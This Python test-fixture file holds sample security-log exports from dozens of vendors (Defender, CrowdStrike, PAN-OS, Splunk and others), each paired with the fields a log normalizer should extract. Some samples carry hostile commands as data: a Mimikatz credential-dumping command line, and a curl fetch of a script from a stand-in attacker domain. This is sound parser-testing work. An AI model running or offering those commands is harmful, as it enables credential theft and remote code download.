"""Export samples from the major security vendors, in their own field names and
formats, with what the generic reader must get out of each.

One fixed event everywhere, so a miss is easy to read: host WS01, user jdoe (CORP
domain or jdoe@corp.com), attacker 185.220.101.4, internal 10.0.0.5, at
2026-10-01 10:05:00 UTC, SHA256 "a"*64. `want` lists normalized values of the
FIRST row; "severity" is what fusion's alert gate reads.

Field names follow each vendor's documented export / API / SIEM-connector schema.
"""
import json

T = "2026-10-01T10:05:00"
H = "a" * 64
ATK, INT = "185.220.101.4", "10.0.0.5"


def _jl(*objs):
    return "\n".join(json.dumps(o) for o in objs)


def _j(o):
    return json.dumps(o)


SAMPLES = [
    # ------------------------------------------------------------- EDR / XDR
    ("Microsoft Defender XDR - Advanced Hunting CSV", "edr",
     "Timestamp,DeviceName,AccountDomain,AccountName,FileName,SHA256,ProcessCommandLine,RemoteIP,ActionType\n"
     f"{T}Z,WS01.corp.local,corp,jdoe,mimi.exe,{H},mimi.exe sekurlsa::logonpasswords,{ATK},ProcessCreated\n",
     {"ts": T, "host": "WS01.corp.local", "hash": H, "dst_ip": ATK, "cmdline": "mimi.exe sekurlsa::logonpasswords"}),
    ("Microsoft Defender for Endpoint - alerts API", "edr",
     _j({"value": [{"id": "da637", "title": "Credential theft tool detected", "severity": "High",
                    "computerDnsName": "ws01.corp.local", "alertCreationTime": f"{T}.1234567Z",
                    "evidence": [{"entityType": "File", "sha256": H, "fileName": "mimi.exe"}],
                    "relatedUser": {"userName": "jdoe", "domainName": "CORP"}}]}),
     {"ts": T, "host": "ws01.corp.local", "rule": "Credential theft tool detected", "severity": "high",
      "user": "jdoe", "hashes": [H]}),
    ("CrowdStrike Falcon - Alerts API", "edr",
     _j({"resources": [{"composite_id": "x", "device": {"hostname": "WS01", "local_ip": INT, "external_ip": ATK},
                        "user_name": "jdoe", "cmdline": "mimi.exe sekurlsa::logonpasswords", "sha256": H,
                        "severity_name": "High", "severity": 70, "display_name": "CredentialDumping",
                        "tactic": "Credential Access", "created_timestamp": f"{T}.123456789Z"}]}),
     {"ts": T, "host": "WS01", "user": "jdoe", "hash": H, "severity": "high", "rule": "CredentialDumping"}),
    ("CrowdStrike Falcon - FDR ProcessRollup2", "edr",
     _jl({"event_simpleName": "ProcessRollup2", "aid": "abc", "ComputerName": "WS01", "UserName": "jdoe",
          "CommandLine": "mimi.exe sekurlsa::logonpasswords", "SHA256HashData": H, "ImageFileName": "\\Device\\mimi.exe",
          "timestamp": "1790849100000", "LocalAddressIP4": INT}),
     {"ts": T, "host": "WS01", "user": "jdoe", "hash": H, "cmdline": "mimi.exe sekurlsa::logonpasswords"}),
    ("SentinelOne - threats API", "edr",
     _j({"data": [{"id": "1", "agentRealtimeInfo": {"agentComputerName": "WS01", "agentOsName": "Windows 10"},
                   "threatInfo": {"threatName": "mimi.exe", "sha256": H, "confidenceLevel": "malicious",
                                  "classification": "Malware", "createdAt": f"{T}.000000Z",
                                  "processUser": "CORP\\jdoe", "filePath": "C:\\Users\\jdoe\\mimi.exe"}}]}),
     {"ts": T, "host": "WS01", "user": "CORP\\jdoe", "hash": H, "severity": "high"}),
    ("SentinelOne - unified alerts API", "edr",
     _j({"data": [{"alertInfo": {"eventType": "PROCESSCREATION", "createdAt": f"{T}.000Z", "srcMachineIp": INT},
                   "ruleInfo": {"name": "Credential dumping via LSASS", "severity": "Critical"},
                   "agentDetectionInfo": {"name": "WS01"}, "sourceProcessInfo": {"name": "mimi.exe",
                   "fileHashSha256": H, "user": "CORP\\jdoe"}}]}),
     {"ts": T, "rule": "Credential dumping via LSASS", "severity": "critical", "hash": H}),
    ("ESET PROTECT - detections API", "edr",
     _jl({"category": "DETECTION_CATEGORY_ANTIVIRUS", "typeName": "Trojan", "severityLevel": "SEVERITY_LEVEL_HIGH",
          "occurTime": f"{T}Z", "objectHashSha1": "b" * 40,
          "networkCommunication": {"remoteIpAddress": ATK, "remotePort": 443, "localIpAddress": INT},
          "context": {"process": {"path": "C:\\Users\\jdoe\\mimi.exe"}, "userName": "CORP\\jdoe",
                      "circumstances": "Malware: Win32/PSW.Fareit.A"}}),
     {"ts": T, "user": "CORP\\jdoe", "src_ip": INT, "dst_ip": ATK, "severity": "high",
      "rule": "Malware: Win32/PSW.Fareit.A"}),
    ("VMware Carbon Black Cloud - alerts", "edr",
     _j({"results": [{"id": "1", "device_name": "CORP\\WS01", "device_username": "CORP\\jdoe",
                      "process_name": "mimi.exe", "process_sha256": H, "reason": "Credential theft tool",
                      "severity": 8, "create_time": f"{T}.000Z", "device_external_ip": ATK,
                      "device_internal_ip": INT}]}),
     {"ts": T, "user": "CORP\\jdoe", "hash": H, "rule": "Credential theft tool", "severity": "high"}),
    ("Palo Alto Cortex XDR - alerts", "edr",
     _j({"reply": {"alerts": [{"alert_id": "1", "host_name": "WS01", "user_name": "CORP\\jdoe",
                               "action_local_ip": INT, "action_remote_ip": ATK, "severity": "high",
                               "name": "Credential dumping via Mimikatz", "detection_timestamp": 1790849100000,
                               "actor_process_command_line": "mimi.exe sekurlsa::logonpasswords",
                               "action_file_sha256": H}]}}),
     {"ts": T, "host": "WS01", "user": "CORP\\jdoe", "dst_ip": ATK, "severity": "high", "hash": H}),
    ("Sophos Central - SIEM alerts", "edr",
     _jl({"id": "1", "type": "Event::Endpoint::Threat::Detected", "severity": "high", "location": "WS01",
          "source": "CORP\\jdoe", "name": "Malware detected: 'Mimikatz' at 'C:\\Users\\jdoe\\mimi.exe'",
          "created_at": f"{T}.000Z", "threat": "Mimikatz"}),
     {"ts": T, "host": "WS01", "severity": "high", "user": "CORP\\jdoe"}),
    ("Trend Micro Vision One - workbench alerts", "edr",
     _j({"items": [{"id": "WB-1", "model": "Credential Dumping", "severity": "high", "createdDateTime": f"{T}Z",
                    "impactScope": {"entities": [{"entityType": "host", "entityValue": {"name": "WS01", "ips": [INT]}}]},
                    "indicators": [{"type": "fileSha256", "value": H}]}]}),
     {"ts": T, "severity": "high", "rule": "Credential Dumping"}),
    ("Cisco Secure Endpoint (AMP) - events", "edr",
     _j({"data": [{"event_type": "Threat Detected", "severity": "High", "date": f"{T}+00:00",
                   "computer": {"hostname": "WS01", "external_ip": ATK, "user": "jdoe@WS01"},
                   "file": {"file_name": "mimi.exe", "identity": {"sha256": H}},
                   "detection": "W32.Mimikatz"}]}),
     {"ts": T, "host": "WS01", "severity": "high", "hash": H}),
    ("Elastic Defend (ECS)", "edr",
     _jl({"@timestamp": f"{T}.000Z", "host": {"name": "WS01", "ip": [INT]}, "user": {"name": "jdoe", "domain": "CORP"},
          "process": {"name": "mimi.exe", "command_line": "mimi.exe sekurlsa::logonpasswords", "hash": {"sha256": H}},
          "kibana.alert.rule.name": "Mimikatz Memssp Log File Detected", "kibana.alert.severity": "high"}),
     {"ts": T, "host": "WS01", "user": "jdoe", "hash": H, "severity": "high",
      "rule": "Mimikatz Memssp Log File Detected"}),
    ("Wazuh - alerts.json", "edr",
     _jl({"timestamp": f"{T}.000+0000", "rule": {"level": 12, "description": "Mimikatz usage detected",
                                                  "mitre": {"id": ["T1003"]}},
          "agent": {"id": "001", "name": "WS01", "ip": INT},
          "data": {"srcip": ATK, "win": {"eventdata": {"targetUserName": "jdoe", "image": "mimi.exe"}}},
          "full_log": "mimikatz sekurlsa::logonpasswords"}),
     {"ts": T, "host": "WS01", "severity": "critical", "rule": "Mimikatz usage detected", "src_ip": ATK}),
    ("Symantec Endpoint Protection - CSV risk export", "edr",
     "Event Time,Computer Name,User Name,Risk Name,File Path,Action Taken,Severity,IP Address\n"
     f"2026-10-01 10:05:00,WS01,jdoe,Hacktool.Mimikatz,C:\\Users\\jdoe\\mimi.exe,Quarantined,High,{INT}\n",
     {"ts": T, "host": "WS01", "user": "jdoe", "rule": "Hacktool.Mimikatz", "severity": "high"}),
    ("ESET PROTECT - syslog JSON", "edr",
     "<134>Oct  1 10:05:00 era ERAServer[1]: " + _j({"event_type": "Threat_Event", "ipv4": INT, "hostname": "WS01",
                                                    "severity": "Warning", "threat_name": "Win64/Riskware.Mimikatz",
                                                    "username": "CORP\\jdoe", "hash": H, "occured": "01-Oct-2026 10:05:00"}) + "\n",
     {"host": "WS01", "user": "CORP\\jdoe", "hash": H, "rule": "Win64/Riskware.Mimikatz"}),
    ("Trellix ePO - threat events CSV", "edr",
     "Event Generated Time (UTC),Threat Target Host Name,Threat Target User Name,Threat Name,Threat Severity,Threat Target IPv4 Address\n"
     f"10/01/2026 10:05:00,WS01,CORP\\jdoe,Mimikatz,Critical,{INT}\n",
     {"ts": T, "host": "WS01", "user": "CORP\\jdoe", "rule": "Mimikatz", "severity": "critical"}),

    # --------------------------------------------------------------- Identity
    ("Okta - System Log", "idp",
     _jl({"published": f"{T}.000Z", "actor": {"alternateId": "jdoe@corp.com"}, "client": {"ipAddress": ATK},
          "eventType": "user.session.start", "displayMessage": "User login to Okta",
          "outcome": {"result": "FAILURE", "reason": "INVALID_CREDENTIALS"}, "severity": "WARN"}),
     {"ts": T, "user": "jdoe@corp.com", "src_ip": ATK, "rule": "User login to Okta"}),
    ("Microsoft Entra ID - sign-in logs", "idp",
     _j({"value": [{"createdDateTime": f"{T}Z", "userPrincipalName": "jdoe@corp.com", "ipAddress": ATK,
                    "appDisplayName": "Office 365", "status": {"errorCode": 50126},
                    "riskLevelDuringSignIn": "high", "deviceDetail": {"displayName": "WS01"}}]}),
     {"ts": T, "user": "jdoe@corp.com", "src_ip": ATK, "severity": "high"}),
    ("Microsoft Entra ID Protection - risk detections", "idp",
     _j({"value": [{"riskEventType": "unfamiliarFeatures", "riskLevel": "medium", "activityDateTime": f"{T}Z",
                    "userPrincipalName": "jdoe@corp.com", "ipAddress": ATK}]}),
     {"ts": T, "user": "jdoe@corp.com", "src_ip": ATK, "severity": "medium", "rule": "unfamiliarFeatures"}),
    ("Google Workspace - login audit", "idp",
     _j({"items": [{"id": {"time": f"{T}.000Z", "applicationName": "login"}, "actor": {"email": "jdoe@corp.com"},
                    "ipAddress": ATK, "events": [{"type": "login", "name": "login_failure"}]}]}),
     {"ts": T, "user": "jdoe@corp.com", "src_ip": ATK}),
    ("Cisco Duo - authentication logs", "idp",
     _j({"response": {"authlogs": [{"timestamp": 1790849100, "user": {"name": "jdoe"},
                                    "access_device": {"ip": ATK, "hostname": "WS01"}, "result": "denied",
                                    "reason": "user_marked_fraud", "factor": "duo_push"}]}}),
     {"ts": T, "user": "jdoe", "src_ip": ATK, "action": "denied"}),
    ("Auth0 - tenant logs", "idp",
     _jl({"date": f"{T}.000Z", "type": "f", "description": "Wrong email or password.", "ip": ATK,
          "user_name": "jdoe@corp.com", "client_name": "App"}),
     {"ts": T, "user": "jdoe@corp.com", "src_ip": ATK}),
    ("OneLogin - events", "idp",
     _j({"data": [{"created_at": f"{T}.000Z", "event_type_id": 6, "user_name": "jdoe@corp.com", "ipaddr": ATK,
                   "notes": "Failed login"}]}),
     {"ts": T, "user": "jdoe@corp.com", "src_ip": ATK}),
    ("Ping Identity - audit", "idp",
     _jl({"recordedAt": f"{T}.000Z", "action": {"type": "USER.ACCESS_DENIED"},
          "actors": {"user": {"name": "jdoe@corp.com"}}, "source": {"ipAddress": ATK}, "result": {"status": "FAILED"}}),
     {"ts": T, "user": "jdoe@corp.com", "src_ip": ATK}),
    ("JumpCloud - directory insights", "idp",
     _jl({"timestamp": f"{T}.000Z", "event_type": "sso_auth", "initiated_by": {"username": "jdoe"},
          "client_ip": ATK, "success": False}),
     {"ts": T, "user": "jdoe", "src_ip": ATK}),

    # ---------------------------------------------------------- Firewall / net
    ("Palo Alto PAN-OS - threat CSV export", "firewall",
     "Receive Time,Type,Threat/Content Type,Source address,Destination address,Source User,Rule,Application,"
     "Threat/Content Name,Severity,Action\n"
     f"2026/10/01 10:05:00,THREAT,spyware,{INT},{ATK},corp\\jdoe,allow-out,web-browsing,Cobalt Strike C2,critical,reset-both\n",
     {"ts": T, "src_ip": INT, "dst_ip": ATK, "user": "corp\\jdoe", "rule": "Cobalt Strike C2", "severity": "critical"}),
    ("Palo Alto PAN-OS - CEF", "firewall",
     f"Oct  1 10:05:00 pa01 CEF:0|Palo Alto Networks|PAN-OS|10.1|spyware|THREAT|9|rt=Oct 01 2026 10:05:00 GMT "
     f"src={INT} dst={ATK} suser=corp\\jdoe cs1Label=Rule cs1=allow-out act=reset-both\n",
     {"ts": T, "src_ip": INT, "dst_ip": ATK, "user": "corp\\jdoe", "severity": "critical"}),
    ("Fortinet FortiGate - key=value", "firewall",
     f'date=2026-10-01 time=10:05:00 devname="FG100" type="utm" subtype="ips" level="alert" srcip={INT} '
     f'dstip={ATK} action="dropped" attack="Backdoor.Cobalt.Strike.Beacon" user="jdoe" crlevel="critical"\n',
     {"ts": T, "src_ip": INT, "dst_ip": ATK, "user": "jdoe", "severity": "critical"}),
    ("Check Point - LEEF", "firewall",
     f"LEEF:2.0|Check Point|VPN-1 & FireWall-1|1.0|Prevent|time=1790849100\tsrc={INT}\tdst={ATK}\taction=Prevent"
     "\tseverity=High\tprotection_name=Cobalt Strike Beacon\tsrc_user_name=jdoe\n",
     {"ts": T, "src_ip": INT, "dst_ip": ATK, "severity": "high"}),
    ("Cisco ASA - syslog", "firewall",
     f"Oct  1 2026 10:05:00 asa01 : %ASA-4-106023: Deny tcp src outside:{ATK}/4444 dst inside:{INT}/445 "
     'by access-group "outside_in"\n',
     {"ips": [ATK, INT]}),
    ("Cisco Firepower (FTD) - intrusion syslog", "firewall",
     f'Oct  1 10:05:00 ftd01 SFIMS: Protocol: TCP, SrcIP: {INT}, DstIP: {ATK}, SrcPort: 51000, DstPort: 443, '
     'Priority: 1, Message: "MALWARE-CNC Cobalt Strike beacon"\n',
     {"ips": [INT, ATK]}),
    ("Juniper SRX - structured syslog", "firewall",
     f'<14>1 2026-10-01T10:05:00.000Z srx01 RT_FLOW - RT_FLOW_SESSION_DENY [junos@2636.1.1.1.2.26 '
     f'source-address="{INT}" source-port="51000" destination-address="{ATK}" destination-port="443" '
     'application="UNKNOWN" policy-name="deny-out" username="jdoe"]\n',
     {"ts": T, "src_ip": INT, "dst_ip": ATK}),
    ("SonicWall - syslog", "firewall",
     f'id=firewall sn=0017C5 time="2026-10-01 10:05:00" fw=203.0.113.1 pri=1 c=32 m=82 msg="Possible port scan '
     f'detected" src={ATK}:4444:X1 dst={INT}:445:X0 proto=tcp/445\n',
     {"ts": T}),
    ("pfSense - filterlog", "firewall",
     f"Oct  1 10:05:00 pfsense filterlog[1]: 5,,,1000000103,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,{ATK},{INT},4444,445,0,S\n",
     {"src_ip": ATK, "dst_ip": INT}),
    ("Sophos Firewall (XG) - syslog", "firewall",
     f'device_name="SFW" timestamp="2026-10-01T10:05:00+0000" log_type="IDP" severity="Warning" '
     f'src_ip="{ATK}" dst_ip="{INT}" signature_msg="Cobalt Strike Beacon" user_name="jdoe" action="Drop"\n',
     {"ts": T, "src_ip": ATK, "dst_ip": INT, "rule": "Cobalt Strike Beacon"}),
    ("AWS VPC Flow Logs", "firewall",
     "version account-id interface-id srcaddr dstaddr srcport dstport protocol packets bytes start end action log-status\n"
     f"2 123456789012 eni-1 {INT} {ATK} 51000 443 6 10 840 1790849100 1790849160 REJECT OK\n"
     f"2 123456789012 eni-1 {INT} {ATK} 51001 443 6 10 840 1790849101 1790849161 REJECT OK\n",
     {"ts": T, "src_ip": INT, "dst_ip": ATK, "action": "REJECT"}),
    ("Azure NSG flow logs", "firewall",
     _j({"records": [{"time": f"{T}.000Z", "category": "NetworkSecurityGroupFlowEvent",
                      "properties": {"flows": [{"rule": "DenyAll", "flows": [{"flowTuples": [
                          f"1790849100,{ATK},{INT},4444,445,T,I,D"]}]}]}}]}),
     {"ts": T, "ips": [ATK, INT]}),
    ("Zeek - conn.log TSV", "firewall",
     "#separator \\x09\n#set_separator\t,\n#path\tconn\n"
     "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tservice\n"
     "#types\ttime\tstring\taddr\tport\taddr\tport\tenum\tstring\n"
     f"1790849100.123456\tC1\t{INT}\t51000\t{ATK}\t443\ttcp\tssl\n",
     {"ts": T, "src_ip": INT, "dst_ip": ATK}),
    ("Zeek - JSON", "firewall",
     _jl({"ts": 1790849100.123456, "uid": "C1", "id.orig_h": INT, "id.orig_p": 51000, "id.resp_h": ATK,
          "id.resp_p": 443, "query": "update-check.evil-c2.net"}),
     {"ts": T, "src_ip": INT, "dst_ip": ATK, "domain": "update-check.evil-c2.net"}),
    ("Suricata - eve.json alert", "firewall",
     _jl({"timestamp": f"{T}.123456+0000", "event_type": "alert", "src_ip": INT, "src_port": 51000,
          "dest_ip": ATK, "dest_port": 443,
          "alert": {"signature": "ET MALWARE Cobalt Strike Beacon", "severity": 1, "category": "A Network Trojan"}}),
     {"ts": T, "src_ip": INT, "dst_ip": ATK, "rule": "ET MALWARE Cobalt Strike Beacon", "severity": "high"}),

    # ------------------------------------------------------- Proxy / DNS / web
    ("Zscaler ZIA - NSS web log", "proxy",
     _jl({"datetime": "Wed Oct 01 10:05:00 2026", "user": "jdoe@corp.com", "url": "update-check.evil-c2.net/a.sh",
          "action": "Blocked", "threatname": "Win32.Backdoor.CobaltStrike", "clientip": INT, "serverip": ATK,
          "urlcat": "Malicious Content", "riskscore": 95}),
     {"ts": T, "user": "jdoe@corp.com", "src_ip": INT, "dst_ip": ATK, "severity": "critical"}),
    ("Netskope - alerts", "proxy",
     _j({"result": [{"timestamp": 1790849100, "user": "jdoe@corp.com", "srcip": INT, "dstip": ATK,
                     "alert_name": "Malware download", "severity": "high", "url": "http://update-check.evil-c2.net/a.sh"}]}),
     {"ts": T, "user": "jdoe@corp.com", "src_ip": INT, "dst_ip": ATK, "severity": "high", "rule": "Malware download"}),
    ("Cloudflare - HTTP requests (Logpush)", "proxy",
     _jl({"EdgeStartTimestamp": 1790849100000000000, "ClientIP": ATK, "ClientRequestHost": "portal.corp.com",
          "ClientRequestURI": "/wp-login.php", "SecurityAction": "block", "WAFAttackScore": 5}),
     {"ts": T, "src_ip": ATK, "domain": "portal.corp.com", "action": "block"}),
    ("Squid - access.log", "proxy",
     f"1790849100.123    120 {INT} TCP_MISS/200 1234 GET http://update-check.evil-c2.net/a.sh jdoe "
     f"HIER_DIRECT/{ATK} text/plain\n"
     f"1790849101.456    110 {INT} TCP_MISS/200 1234 GET http://update-check.evil-c2.net/b.sh jdoe "
     f"HIER_DIRECT/{ATK} text/plain\n",
     {"ts": T, "ips": [INT, ATK], "domains": ["update-check.evil-c2.net"]}),
    ("Cisco Umbrella - DNS logs CSV (no header)", "proxy",
     f'"2026-10-01 10:05:00","WS01","WS01,Corp","{INT}","{ATK}","Blocked","1 (A)","NOERROR",'
     '"update-check.evil-c2.net.","Malware"\n'
     f'"2026-10-01 10:05:02","WS01","WS01,Corp","{INT}","{ATK}","Blocked","1 (A)","NOERROR",'
     '"update-check.evil-c2.net.","Malware"\n',
     {"ts": T, "src_ip": INT}),
    ("Windows DNS debug log", "proxy",
     f"10/1/2026 10:05:00 AM 0E3C PACKET  00000 UDP Rcv {INT}     a1b2   Q [0001   D   NOERROR] A      "
     "(12)update-check(7)evil-c2(3)net(0)\n",
     {"ips": [INT]}),
    ("IIS / W3C extended", "proxy",
     "#Software: Microsoft Internet Information Services 10.0\n#Version: 1.0\n"
     "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status\n"
     f"2026-10-01 10:05:00 {INT} POST /owa/auth.owa - 443 jdoe {ATK} Mozilla/5.0 302\n",
     {"ts": T, "src_ip": ATK, "user": "jdoe"}),

    # ------------------------------------------------------------ SIEM exports
    ("Splunk - CSV export", "siem",
     "_time,host,source,sourcetype,src,dest,user,signature,severity,_raw\n"
     f"2026-10-01T10:05:00.000+00:00,WS01,WinEventLog:Security,wineventlog,{ATK},{INT},jdoe,"
     f"Brute force success,high,\"An account was successfully logged on. Source Network Address: {ATK}\"\n",
     {"ts": T, "host": "WS01", "src_ip": ATK, "dst_ip": INT, "user": "jdoe", "severity": "high"}),
    ("Elastic / Kibana - search export", "siem",
     _j({"hits": {"hits": [{"_source": {"@timestamp": f"{T}.000Z", "host": {"name": "WS01"},
                                        "source": {"ip": ATK}, "user": {"name": "jdoe"},
                                        "event": {"action": "logon-failed", "severity": 73},
                                        "rule": {"name": "Brute force"}}}]}}),
     {"ts": T, "host": "WS01", "src_ip": ATK, "user": "jdoe", "rule": "Brute force", "severity": "high"}),
    ("Microsoft Sentinel - KQL results CSV", "siem",
     "TimeGenerated [UTC],Computer,Account,IpAddress,AlertName,AlertSeverity,CompromisedEntity\n"
     f"\"10/1/2026, 10:05:00.000 AM\",WS01.corp.local,CORP\\jdoe,{ATK},Brute force attack,High,WS01\n",
     {"ts": T, "host": "WS01.corp.local", "user": "CORP\\jdoe", "src_ip": ATK, "severity": "high"}),
    ("IBM QRadar - offense events CSV", "siem",
     "Event Name,Log Source,Start Time,Low Level Category,Source IP,Destination IP,Username,Magnitude\n"
     f"Failed Login,WinCollect @ WS01,\"Oct 1, 2026, 10:05:00 AM\",Brute Force Login,{ATK},{INT},jdoe,8\n",
     {"ts": T, "src_ip": ATK, "dst_ip": INT, "user": "jdoe", "rule": "Failed Login", "severity": "high"}),
    ("Google SecOps (Chronicle) - UDM", "siem",
     _jl({"metadata": {"event_timestamp": f"{T}Z", "event_type": "USER_LOGIN", "product_name": "Okta"},
          "principal": {"ip": [ATK], "hostname": "WS01"}, "target": {"user": {"userid": "jdoe"}},
          "security_result": [{"severity": "HIGH", "rule_name": "Password spray"}]}),
     {"ts": T, "src_ip": ATK, "user": "jdoe"}),
    ("Sumo Logic - search export", "siem",
     "_messagetime,_sourcehost,_sourcecategory,_raw\n"
     f"1790849100000,WS01,windows/security,\"Failed logon for CORP\\jdoe from {ATK}\"\n",
     {"ts": T, "host": "WS01", "users": ["CORP\\jdoe"], "ips": [ATK]}),
    ("ArcSight - CEF", "siem",
     f"CEF:0|Microsoft|Microsoft Windows||Microsoft-Windows-Security-Auditing:4625|An account failed to log on|5|"
     f"rt=1790849100000 dhost=WS01 duser=jdoe src={ATK} dst={INT}\n",
     {"ts": T, "src_ip": ATK, "dst_ip": INT, "user": "jdoe"}),
    ("LogRhythm - alarm export CSV", "siem",
     "Alarm Date,Alarm Rule Name,Impacted Host,Origin Login,Origin IP,Risk Based Priority\n"
     f"10/01/2026 10:05:00,AIE: Brute Force,WS01,jdoe,{ATK},85\n",
     {"ts": T, "src_ip": ATK, "user": "jdoe", "rule": "AIE: Brute Force"}),
    ("Graylog - search export CSV", "siem",
     "timestamp,source,message\n"
     f"2026-10-01T10:05:00.000Z,WS01,\"sshd: Failed password for jdoe from {ATK}\"\n",
     {"ts": T, "host": "WS01", "ips": [ATK]}),

    # ------------------------------------------------------- Email / cloud
    ("Proofpoint TAP - SIEM API", "other",
     _j({"messagesDelivered": [{"messageTime": f"{T}.000Z", "senderIP": ATK, "sender": "attacker@evil-c2.net",
                                "recipient": ["jdoe@corp.com"], "subject": "Invoice",
                                "threatsInfoMap": [{"threat": "update-check.evil-c2.net", "classification": "phish"}]}]}),
     {"ts": T, "src_ip": ATK}),
    ("Mimecast - TTP URL logs", "other",
     _j({"data": [{"clickLogs": [{"date": f"{T}+0000", "userEmailAddress": "jdoe@corp.com",
                                  "url": "http://update-check.evil-c2.net/a.sh", "action": "block",
                                  "category": "Malicious", "userIpAddress": INT}]}]}),
     {"ts": T, "user": "jdoe@corp.com", "src_ip": INT}),
    ("Microsoft 365 - message trace CSV", "other",
     "Received,SenderAddress,RecipientAddress,Subject,Status,FromIP\n"
     f"2026-10-01T10:05:00.0000000Z,attacker@evil-c2.net,jdoe@corp.com,Invoice,Delivered,{ATK}\n",
     {"ts": T, "src_ip": ATK}),
    ("Google Cloud - audit log", "other",
     _jl({"timestamp": f"{T}.000Z", "severity": "NOTICE", "protoPayload": {
         "authenticationInfo": {"principalEmail": "jdoe@corp.com"},
         "requestMetadata": {"callerIp": ATK}, "methodName": "SetIamPolicy"}}),
     {"ts": T, "user": "jdoe@corp.com", "src_ip": ATK}),

    # ------------------------------------------------------------ Host logs
    ("Windows events - wevtutil XML", "other",
     '<Events><Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
     '<Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4625</EventID>'
     f'<TimeCreated SystemTime="{T}.1234567Z"/><Computer>WS01.corp.local</Computer></System><EventData>'
     f'<Data Name="TargetUserName">jdoe</Data><Data Name="TargetDomainName">CORP</Data>'
     f'<Data Name="IpAddress">{ATK}</Data></EventData></Event></Events>',
     {"ts": T, "host": "WS01.corp.local", "user": "jdoe", "src_ip": ATK}),
    ("Windows events - PowerShell Export-Csv", "other",
     "\"TimeCreated\",\"Id\",\"MachineName\",\"Message\"\n"
     f"\"10/1/2026 10:05:00 AM\",\"4625\",\"WS01.corp.local\",\"An account failed to log on. "
     f"Account Name: jdoe Source Network Address: {ATK}\"\n",
     {"ts": T, "host": "WS01.corp.local", "ips": [ATK]}),
    ("Linux auditd", "other",
     'type=EXECVE msg=audit(1790849100.123:456): argc=3 a0="curl" a1="-s" a2="http://update-check.evil-c2.net/a.sh"\n'
     'type=SYSCALL msg=audit(1790849100.123:456): arch=c000003e syscall=59 success=yes exit=0 auid=1000 uid=0 exe="/usr/bin/curl"\n',
     {"ts": T}),
    ("Linux auth.log", "other",
     f"Oct  1 10:05:00 web01 sshd[2211]: Failed password for jdoe from {ATK} port 51122 ssh2\n",
     {"ips": [ATK]}),
]
